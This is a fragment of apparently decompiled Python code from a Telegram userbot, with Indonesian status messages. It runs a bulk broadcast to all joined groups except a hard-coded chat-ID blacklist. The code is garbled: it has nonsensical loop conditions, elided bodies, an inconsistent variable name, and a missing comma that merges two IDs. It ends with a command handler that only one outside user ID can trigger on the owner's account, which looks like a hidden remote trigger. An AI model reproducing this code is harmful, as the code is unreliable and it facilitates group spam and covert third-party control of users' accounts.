...
while 0 < 6:
    ...
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [-1002126334237, -1001913275816, -1002007277763, -1001608701614, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001812143750, -1001001951726069]
        ...
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            ...
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    ...
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**✅Berhasil Mengirim Pesan Group:** `{done}` \n **❌Gagal Mengirim Pesan Group** `{error}`"
    )


@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(6508228335) & ~filters.me)
